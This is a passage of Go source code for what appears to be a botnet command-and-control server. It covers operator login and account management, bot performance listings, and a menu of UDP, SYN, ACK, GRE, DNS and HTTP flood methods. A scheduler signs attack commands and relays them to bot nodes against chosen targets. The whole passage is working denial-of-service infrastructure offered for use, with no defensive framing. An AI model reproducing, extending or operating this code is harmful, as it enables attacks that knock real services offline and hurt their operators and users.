func cliDeleteAccount(c net.Conn, tokens []string) {
	if len(tokens) < 2 {
		slowPrint(c, "Usage: deluser <username>", 15*time.Millisecond, ansiRed)
		return
	}
	uname := sanitizeInput(tokens[1])
	if uname == "root" {
		slowPrint(c, "Cannot delete root user", 15*time.Millisecond, ansiRed)
		return
	}
	accts := loadAccounts()
	found := false
	for i, a := range accts {
		if a.Username == uname {
			accts = append(accts[:i], accts[i+1:]...)
			found = true
			break
		}
	}
	if !found {
		slowPrint(c, "Error: User not found", 15*time.Millisecond, ansiRed)
		return
	}
	persistAccounts(accts)
	auditWrite("SYSTEM", "USER", fmt.Sprintf("User %s deleted", uname))
	slowPrint(c, fmt.Sprintf("User %s deleted successfully", uname), 15*time.Millisecond, ansiGreen)
}

func cliResetPassword(c net.Conn, cli *CLISession, tokens []string) {
	if len(tokens) < 2 && cli.acct.roleLevel() > 1 {
		slowPrint(c, "Usage: resetpw <username>", 15*time.Millisecond, ansiRed)
		return
	}
	var target string
	if len(tokens) >= 2 {
		if cli.acct.roleLevel() > 1 {
			slowPrint(c, "Permission denied: Admin level required", 15*time.Millisecond, ansiRed)
			return
		}
		target = sanitizeInput(tokens[1])
	} else {
		target = cli.acct.Username
	}
	accts := loadAccounts()
	found := false
	for _, a := range accts {
		if a.Username == target {
			found = true
			break
		}
	}
	if !found {
		slowPrint(c, "Error: User not found", 15*time.Millisecond, ansiRed)
		return
	}
	tok := secureToken(32)
	exp := time.Now().Add(cfg.ResetTokenTTL)
	resetTokens.Lock()
	resetTokens.store[target] = PasswordToken{user: target, token: tok, expires: exp}
	resetTokens.Unlock()
	auditWrite(cli.acct.Username, "PASSWORD", fmt.Sprintf("Generated reset token for %s", target))
}

func cliShowAudit(c net.Conn) {
	const maxLines = 20

	fh, err := os.Open(cfg.AuditPath)
	if err != nil {
		slowPrint(c, "Error opening record log", 15*time.Millisecond, ansiRed)
		return
	}
	defer fh.Close()

	c.Write([]byte("\033[2J\033[H"))
	bdr := tableBorder()
	c.Write([]byte(bdr))
	c.Write([]byte(fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r",
		ansiBase, ansiViolet, maxLines)))
	c.Write([]byte(bdr))

	lines := make([]string, 0, maxLines)
	sc := bufio.NewScanner(fh)
	for sc.Scan() {
		ln := sc.Text()
		if len(lines) >= maxLines {
			lines = lines[1:]
		}
		lines = append(lines, ln)
	}
	for _, ln := range lines {
		if len(ln) > 120 {
			ln = ln[:117] + "..."
		}
		fmt.Fprintf(c, "%s\n\r", ln)
	}
	c.Write([]byte(bdr))
	slowPrint(c, "Press any key to continue...", 15*time.Millisecond, ansiBlue)
	buf := make([]byte, 1)
	c.Read(buf)
}

func cliServerInfo(c net.Conn) {
	c.Write([]byte("\033[2J\033[H"))
	fs := collectFleetStats()
	fmt.Fprintf(c, "Server Status:\n")
	fmt.Fprintf(c, "Uptime: %s (System: %.2f hours)\n", time.Since(startedAt).Round(time.Second), readUptime()/3600)
	fmt.Fprintf(c, "System Load: %.2f\n", readLoadAvg())
	fmt.Fprintf(c, "System RAM: %.2fGB\n", readMemGB())
	fmt.Fprintf(c, "CPU Cores: %d\n", runtime.NumCPU())
	fmt.Fprintf(c, "Bots: %d (Healthy: %d, Unhealthy: %d)\n", countNodes(), fs.Healthy, fs.Unhealthy)
	fmt.Fprintf(c, "Active Attacks: %d/%d\n", scheduler.count(), scheduler.cap())
	fmt.Fprintf(c, "Active Sessions: %d\n", len(cliClients))
	fmt.Fprintf(c, "Avg Latency: %v\n", fs.AvgLatency.Round(time.Millisecond))
	fmt.Fprintf(c, "Avg Throughput: %.2f/s\n", fs.AvgThroughput)
	fmt.Fprintf(c, "Total RAM: %.1fGB\n", fs.TotalRAM)
	fmt.Fprintf(c, "Total Cores: %d\n", fs.TotalCores)
}

func cliListMethods(c net.Conn) {
	c.Write([]byte("\033[2J\033[H"))
	fmt.Fprintf(c, "Available Attack Methods:\n")
	fmt.Fprintf(c, "!udpflood - Standard UDP flood attack\n")
	fmt.Fprintf(c, "!udpsmart - UDP flood with smart payload\n")
	fmt.Fprintf(c, "!tcpflood - TCP flood attack\n")
	fmt.Fprintf(c, "!synflood - SYN flood attack\n")
	fmt.Fprintf(c, "!ackflood - ACK flood attack\n")
	fmt.Fprintf(c, "!greflood - GRE flood attack\n")
	fmt.Fprintf(c, "!dns - DNS flood attack\n")
	fmt.Fprintf(c, "!http - HTTP flood attack\n")
	fmt.Fprintf(c, "\nType 'help' for more commands\n")
}

func cliNodePerf(c net.Conn) {
	metricsMu.Lock()
	defer metricsMu.Unlock()
	if len(fleetMetrics) == 0 {
		slowPrint(c, "No bot performance data available", 15*time.Millisecond, ansiWarn)
		return
	}
	entries := make([]struct {
		ip string
		nm NodeMetrics
	}, 0, len(fleetMetrics))
	for ip, m := range fleetMetrics {
		entries = append(entries, struct {
			ip string
			nm NodeMetrics
		}{ip, m})
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].ip < entries[j].ip })

	pageSize := 10
	page := 0
	totalPages := (len(entries) + pageSize - 1) / pageSize
	for {
		c.Write([]byte("\033[2J\033[H"))
		fmt.Fprintf(c, "Bot Performance Stats (Page %d/%d) - Total Bots: %d\n\n",
			page+1, totalPages, len(entries))
		fmt.Fprintf(c, "%-20s %-10s %-10s %-6s %-15s %-10s\n",
			"IP", "Latency", "Throughput", "RAM", "Arch", "Last Seen")
		lo := page * pageSize
		hi := lo + pageSize
		if hi > len(entries) {
			hi = len(entries)
		}
		for _, e := range entries[lo:hi] {
			fmt.Fprintf(c, "%-20s %-10v %-10.2f %-6.1f %-15s %-10s\n",
				truncate(e.ip, 20), e.nm.Latency.Round(time.Millisecond),
				e.nm.Throughput, e.nm.RAM, truncate(e.nm.Architecture, 15),
				e.nm.Seen.Format("15:04:05"))
		}
		fmt.Fprintf(c, "\nNavigation: n-next, p-previous, q-quit\n> ")
		rd := bufio.NewReader(c)
		in, _ := rd.ReadString('\n')
		switch strings.TrimSpace(in) {
		case "n":
			if page < totalPages-1 {
				page++
			}
		case "p":
			if page > 0 {
				page--
			}
		case "q":
			return
		}
	}
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n-3] + "..."
	}
	return s
}

// ---------------------------------------------------------------------------
// input sanitisation
// ---------------------------------------------------------------------------

func sanitizeInput(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r == '\n', r == '\r', r == '\t':
			continue
		case unicode.IsGraphic(r) && !unicode.IsControl(r):
			b.WriteRune(r)
		}
	}
	return strings.TrimSpace(b.String())
}

func safeTargetIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, cidr := range reservedCIDR {
		_, block, _ := net.ParseCIDR(cidr)
		if block.Contains(parsed) {
			return false
		}
	}
	bad := []string{"127.0.0.1", "0.0.0.0", "255.255.255.255"}
	for _, b := range bad {
		if ip == b {
			return false
		}
	}
	return true
}

func safeDuration(s string) bool {
	v, _ := strconv.Atoi(s)
	return v > 0 && v <= cfg.MaxTaskSeconds
}

func validatePassword(pw string) error {
	if len(pw) < 12 {
		return fmt.Errorf("password must be at least 12 characters")
	}
	var up, lo, dig, spec bool
	for _, c := range pw {
		switch {
		case unicode.IsUpper(c):
			up = true
		case unicode.IsLower(c):
			lo = true
		case unicode.IsDigit(c):
			dig = true
		case unicode.IsPunct(c) || unicode.IsSymbol(c):
			spec = true
		}
	}
	if !up || !lo || !dig || !spec {
		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
	}
	weak := []string{"password", "123456", "qwerty", "letmein"}
	low := strings.ToLower(pw)
	for _, w := range weak {
		if strings.Contains(low, w) {
			return fmt.Errorf("password is too common or weak")
		}
	}
	return nil
}

func readCLILine(c net.Conn) (string, error) {
	rd := bufio.NewReader(io.LimitReader(c, int64(cfg.MaxMsgSize)))
	s, _ := rd.ReadString('\n')
	s = strings.TrimSuffix(s, "\n")
	s = strings.TrimSuffix(s, "\r")
	return sanitizeInput(s), nil
}

// ---------------------------------------------------------------------------
// cli authentication
// ---------------------------------------------------------------------------

func loginCLI(c net.Conn) (bool, *CLISession) {
	c.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	addr := c.RemoteAddr().String()
	if !loginGate.Allow() {
		c.Close()
		return false, nil
	}

	for attempt := 0; attempt < 3; attempt++ {
		c.Write([]byte(fmt.Sprintf("\033[38;5;%smAttempt %d/3\033\r\n[0m ", ansiWhite, attempt+1)))
		c.Write([]byte(fmt.Sprintf("\033\r\n[38;5;%sm• Username\033[38;5;62m:  \033[0m", ansiBright)))
		uname, _ := readCLILine(c)
		uname = sanitizeInput(uname)
		c.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Password\033[38;5;62m: \033[0m", ansiBright)))
		c.Write([]byte("\033[8m"))
		pw, _ := readCLILine(c)
		c.Write([]byte("\033[0m\033[?25h"))

		if ok, acct := checkCredentials(uname, pw); ok {
			resetTokens.RLock()
			if tok, exists := resetTokens.store[uname]; exists {
				if time.Now().Before(tok.expires) && !tok.used {
					c.Write([]byte("\nYou have a pending password reset. Enter your reset token or press enter to continue:\n"))
					c.Write([]byte(fmt.Sprintf("\033[38;5;%sm• Reset Token\033[38;5;62m: \033[0m", ansiBright)))
					input, _ := readCLILine(c)
					if tokenValid(uname, input) {
						c.Write([]byte("\nPlease enter your new password:\n"))
						c.Write([]byte(fmt.Sprintf("\033[38;5;%sm• New Password\033[38;5;62m: \033[0m", ansiBright)))
						c.Write([]byte("\033[8m"))
						newPW, _ := readCLILine(c)
						c.Write([]byte("\033[0m"))
						hash, _ := bcrypt.GenerateFromPassword([]byte(newPW), bcrypt.DefaultCost)
						accts := loadAccounts()
						for i := range accts {
							if accts[i].Username == uname {
								accts[i].PasswordHash = string(hash)
								break
							}
						}
						persistAccounts(accts)
						resetTokens.Lock()
						entry := resetTokens.store[uname]
						entry.used = true
						resetTokens.store[uname] = entry
						resetTokens.Unlock()
					}
				}
			}
			resetTokens.RUnlock()

			cliCountMu.Lock()
			if cliCountPerUser[uname] >= cfg.MaxCLIPerUser {
				cliCountMu.Unlock()
				c.Close()
				return false, nil
			}
			cliCountPerUser[uname]++
			cliCountMu.Unlock()

			sid := secureToken(32)
			ctx, cancel := context.WithCancel(context.Background())
			sess := &CLISession{
				conn: c, acct: *acct, sid: sid, addr: addr, ctx: ctx, cancel: cancel,
			}
			cliRegistry.set(sid, &cliState{client: sess, lastActive: time.Now(), loginIP: addr})
			c.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
			cliClients = append(cliClients, sess)
			return true, sess
		}
		c.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
		if attempt < 2 {
			c.Write([]byte("Invalid credentials. Please try again.\n"))
		}
	}
	c.Write([]byte("\033[2J\033[H\033[2J\033[3J"))
	c.Close()
	return false, nil
}

func tokenValid(user, input string) bool {
	resetTokens.RLock()
	defer resetTokens.RUnlock()
	if tok, ok := resetTokens.store[user]; ok {
		return tok.token == input && time.Now().Before(tok.expires) && !tok.used
	}
	return false
}

func signPayload(s string) string {
	mac := hmac.New(sha256.New, sigSecret)
	mac.Write([]byte(s))
	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

// ---------------------------------------------------------------------------
// task scheduler
// ---------------------------------------------------------------------------

func (ts *TaskScheduler) processScheduled() {
	tick := time.NewTicker(30 * time.Second)
	defer tick.Stop()

	for range tick.C {
		ts.mu.Lock()
		now := time.Now()
		var remaining []Task
		for _, t := range ts.scheduled {
			if now.After(t.StartedAt) || now.Equal(t.StartedAt) {
				if len(ts.active) < ts.cap() {
					ts.active[t.Conn] = t
					executeTask(t.Conn, t)
					printTagged("ATTACK", fmt.Sprintf("Started scheduled task: %s on %s:%s",
						t.Method, t.Target, t.Port))
				} else {
					ts.pending = append(ts.pending, t)
				}
			} else {
				remaining = append(remaining, t)
			}
		}
		ts.scheduled = remaining
		ts.mu.Unlock()
	}
}

func (ts *TaskScheduler) cancelByConn(c net.Conn) {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	delete(ts.active, c)
	ts.promoteNext()
}

func (ts *TaskScheduler) promoteNext() {
	if len(ts.active) < ts.cap() && len(ts.pending) > 0 {
		sort.Slice(ts.pending, func(i, j int) bool {
			return ts.pending[i].Priority > ts.pending[j].Priority
		})
		next := ts.pending[0]
		ts.pending = ts.pending[1:]
		executeTask(next.Conn, next)
	}
}

func executeTask(c net.Conn, t Task) {
	scheduler.active[c] = t
	cmd := fmt.Sprintf("%s %s %s %s", t.Method, t.Target, t.Port,
		strconv.Itoa(int(t.Duration.Seconds())))
	sig := signPayload(cmd)

	printTagged("ATTACK", fmt.Sprintf("Launching %s on %s:%s for %s (User: %s)",
		t.Method, t.Target, t.Port, t.Duration, t.Owner))

	relayToNodes(fmt.Sprintf("%s %s", cmd, sig), t.Owner)

	go func() {
		time.Sleep(t.Duration)
		scheduler.cancelByConn(c)
		printTagged("ATTACK", fmt.Sprintf("Completed %s on %s:%s", t.Method, t.Target, t.Port))
	}()
}

func (ts *TaskScheduler) allActive() []Task {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	out := make([]Task, 0, len(ts.active))
	for _, t := range ts.active {
		out = append(out, t)
	}
	return out
}

func (ts *TaskScheduler) count() int {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	return len(ts.active)
}

func (ts *TaskScheduler) cap() int {
	return cfg.MaxPendingTasks
}

func (ts *TaskScheduler) userPending(user string) []Task {
	ts.mu.RLock()
	defer ts.mu.RUnlock()
	var out []Task
	for _, t := range ts.pending {
		if t.Owner == user {
			out = append(out, t)
		}
	}
	return out
}

func (ts *TaskScheduler) removePending(user string, idx int) bool {
	ts.mu.Lock()
	defer ts.mu.Unlock()
	pos := 0
	for i, t := range ts.pending {
		if t.Owner == user {
			if pos == idx {
				ts.pending = append(ts.pending[:i], ts.pending[i+1:]...)
				return true
			}
			pos++
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// credential checking
// ---------------------------------------------------------------------------

func checkCredentials(user, pw string) (bool, *Account) {
	raw, err := os.ReadFile(cfg.AccountsPath)
	if err != nil {
		return false, nil
	}
	var accts []Account
	json.Unmarshal(raw, &accts)

	for i, a := range accts {
		if a.Username == user {
			if time.Now().Before(a.LockedUntil) {
				return false, nil
			}
			if err := bcrypt.CompareHashAndPassword([]byte(a.PasswordHash), []byte(pw)); err == nil {
				accts[i].FailedAttempts = 0
				accts[i].LastLogin = time.Now()
				accts[i].LastActivity = time.Now()
				persistAccounts(accts)
				return true, &accts[i]
			}
			accts[i].FailedAttempts++
			if accts[i].FailedAttempts >= 5 {
				accts[i].LockedUntil = time.Now().Add(30 * time.Minute)
			}
			persistAccounts(accts)
			return false, nil
		}
	}
	return false, nil
}

// ---------------------------------------------------------------------------
// session registry helpers
// ---------------------------------------------------------------------------

func (sr *SessionRegistry) get(id string) (*cliState, bool) {
	v, ok := sr.inner.Load(id)
	if !ok {
		return nil, false
	}
	return v.(*cliState), true
}

func (sr *SessionRegistry) set(id string, s *cliState) {
	sr.inner.Store(id, s)
}

func (sr *SessionRegistry) del(id string) {
	sr.inner.Delete(id)
}

func (sr *SessionRegistry) forEach(fn func(key, val interface{}) bool) {
	sr.inner.Range(fn)
}

func removeAccount(user string) error {
	accts := loadAccounts()
	var kept []Account
	for _, a := range accts {
		if a.Username != user {
			kept = append(kept, a)
		}
	}
	if len(kept) == len(accts) {
		return fmt.Errorf("user not found")
	}
	return persistAccounts(kept)
}
